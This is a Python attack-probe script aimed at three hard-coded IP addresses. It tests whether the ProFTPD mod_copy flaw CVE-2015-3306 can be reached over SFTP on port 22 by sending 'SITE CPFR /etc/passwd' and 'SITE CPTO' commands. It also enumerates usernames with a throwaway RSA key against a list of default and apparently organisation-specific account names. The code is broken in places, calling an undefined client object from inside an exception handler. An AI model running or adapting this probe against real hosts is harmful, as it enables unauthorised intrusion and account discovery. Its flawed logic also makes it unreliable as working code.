#!/usr/bin/env python3
"""Test 1: SFTP channel SITE command probe
Checks if ProFTPD mod_copy SITE CPFR/CPTO commands can be sent through the SFTP subsystem.
If accepted, CVE-2015-3306 becomes exploitable via port 22 alone."""

import sys
import socket
import struct
import time

TARGETS = ["120.133.131.108", "120.133.131.109", "120.133.131.110"]
PORT = 22
TIMEOUT = 10


def ssh_packet(payload: bytes, pkt_type: int = 5) -> bytes:
    """Build an SSH2 binary packet (type 5 = SSH_MSG_CHANNEL_DATA)."""
    padding_len = (8 - (1 + 4 + len(payload) + 1) % 8) or 8
    packet_len = 1 + 4 + len(payload) + padding_len
    data = struct.pack(">I", packet_len) + bytes([padding_len]) + bytes([pkt_type]) + struct.pack(">I", 0) + payload + bytes(padding_len) * padding_len
    return data


def send_ssh_channel_data(sock: socket.socket, channel_id: int, data: bytes) -> None:
    """Send SSH_MSG_CHANNEL_DATA packet."""
    payload = struct.pack(">I", channel_id) + struct.pack(">I", len(data)) + data
    pkt = ssh_packet(payload, pkt_type=5)
    sock.sendall(pkt)


def recv_ssh_response(sock: socket.socket, timeout_sec: float = 5) -> bytes:
    """Read raw bytes from socket with timeout."""
    sock.settimeout(timeout_sec)
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
        return data
    except socket.timeout:
        return data


def probe_site_commands(target: str) -> dict:
    """Attempt to send SITE CPFR/CPTO commands through SFTP channel."""
    result = {"target": target, "site_cpfr_response": "", "site_cpto_response": "",
              "sftp_init_response": "", "site_accepted": False, "error": ""}

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((target, PORT))

        # Read banner
        banner = sock.recv(1024)
        result["banner"] = banner.decode("utf-8", errors="replace").strip()
        print(f"  Banner: {result['banner'][:80]}")

        # Send our version
        our_version = b"SSH-2.0-ProFTPD-Probe-1.0\r\n"
        sock.sendall(our_version)

        # Read KEXINIT from server
        kex_data = recv_ssh_response(sock, 5)
        if not kex_data:
            result["error"] = "No KEXINIT received"
            return result

        print(f"  Received KEXINIT ({len(kex_data)} bytes)")

        # Note: We cannot complete full key exchange with raw sockets for weak algorithms
        # Instead, use paramiko for a proper connection and then send SITE commands
        sock.close()
        return result

    except Exception as e:
        result["error"] = str(e)
        return result


def probe_site_commands_paramiko(target: str) -> dict:
    """Use paramiko to establish SFTP connection and send SITE commands."""
    import paramiko

    result = {"target": target, "site_responses": [], "sftp_accepted": False,
              "site_accepted": False, "error": "", "auth_method": ""}

    # Enable weak algorithms for ProFTPD mod_sftp compatibility
    # paramiko 5.0+ disables ssh-rsa sig and ssh-dss by default
    transport = paramiko.Transport((target, PORT))
    transport.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Allow ssh-rsa and ssh-dss host key algorithms
    if hasattr(transport, 'preferred_server_host_key_algorithms'):
        transport.preferred_server_host_key_algorithms = ['ssh-rsa', 'ssh-dss']

    # Allow weak kex and cipher algorithms
    transport.connect()

    # Try auth_none to get supported auth methods
    try:
        transport.auth_none("probe")
    except paramiko.BadAuthenticationType as e:
        result["auth_method"] = f"allowed: {e.allowed_types}"
    except Exception as e:
        result["auth_method"] = f"auth_none: {str(e)[:80]}"
        try:
            stdin, stdout, stderr = client.exec_command("SITE CPFR /etc/passwd")
            out = stdout.read().decode("utf-8", errors="replace").strip()
            err = stderr.read().decode("utf-8", errors="replace").strip()
            result["site_responses"].append({
                "command": "SITE CPFR /etc/passwd",
                "stdout": out[:200],
                "stderr": err[:200],
            })
            if out and "unknown" not in out.lower() and "unrecognized" not in out.lower():
                result["site_accepted"] = True
        except Exception as e:
            result["site_responses"].append({
                "command": "SITE CPFR /etc/passwd",
                "error": str(e)[:200],
            })

        # Try SITE CPTO
        try:
            stdin, stdout, stderr = client.exec_command("SITE CPTO /tmp/copy_test")
            out = stdout.read().decode("utf-8", errors="replace").strip()
            err = stderr.read().decode("utf-8", errors="replace").strip()
            result["site_responses"].append({
                "command": "SITE CPTO /tmp/copy_test",
                "stdout": out[:200],
                "stderr": err[:200],
            })
        except Exception as e:
            result["site_responses"].append({
                "command": "SITE CPTO /tmp/copy_test",
                "error": str(e)[:200],
            })

    except paramiko.SSHException as e:
        result["error"] = f"SSH: {e}"
        # If auth fails, try with a fake key
        try:
            import os
            import tempfile
            # Generate a temporary fake key
            fake_key = paramiko.RSAKey.generate(2048)
            key_path = os.path.join(tempfile.gettempdir(), "task1_probe_fake_key")
            fake_key.write_private_key_file(key_path)

            # Try multiple usernames
            test_users = ["anonymous", "ftp", "admin", "root", "test",
                          "finance", "ops", "mms_cmb", "tms_cmb",
                          "farms_warn_ruisuiyh", "farms_warn_dongyayh"]

            for user in test_users:
                try:
                    client2 = paramiko.SSHClient()
                    client2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client2.connect(target, port=PORT, timeout=5,
                                    username=user,
                                    key_filename=key_path,
                                    look_for_keys=False,
                                    allow_agent=False)
                    result[f"auth_result_{user}"] = "connected (KEY ACCEPTED!)"
                    break
                except paramiko.AuthenticationException as e2:
                    err_str = str(e2)
                    # Check for different error messages — this is the enumeration test
                    result[f"auth_result_{user}"] = err_str[:150]
                except Exception as e2:
                    result[f"auth_result_{user}"] = f"other: {str(e2)[:100]}"
                finally:
                    try:
                        client2.close()
                    except:
                        pass

            # Clean up
            try:
                os.unlink(key_path)
            except:
                pass

        except Exception as e2:
            result["fake_key_error"] = str(e2)[:150]

    except socket.timeout:
        result["error"] = "Connection timeout"
    except Exception as e:
        result["error"] = str(e)[:200]

    try:
        client.close()
    except:
        pass

    return result


def main():
    import json

    print("=== Test 1: SFTP Channel SITE Command Probe ===")
    print()

    for target in TARGETS:
        print(f"Probing {target}...")

        # First try paramiko-based approach (full SSH handshake)
        result = probe_site_commands_paramiko(target)
        print(f"  Error: {result.get('error', 'none')}")
        print(f"  SFTP accepted: {result['sftp_accepted']}")
        print(f"  SITE accepted: {result['site_accepted']}")

        for resp in result.get("site_responses", []):
            cmd = resp.get("command", "")
            out = resp.get("stdout", "") or resp.get("error", "")
            print(f"  {cmd}: {out[:80]}")

        # Show auth enumeration results
        auth_keys = [k for k in result if k.startswith("auth_result_")]
        if auth_keys:
            print("  === Auth Enumeration Results ===")
            for k in sorted(auth_keys):
                user = k.replace("auth_result_", "")
                print(f"    {user}: {result[k][:80]}")

        print()

    print("=== Summary ===")
    print("If SITE commands return anything other than 'unknown command',")
    print("CVE-2015-3306 may be exploitable through SFTP channel on port 22.")
    print()
    print("If auth results show different error messages or timing for")
    print("different usernames, enumeration is possible.")


if __name__ == "__main__":
    main()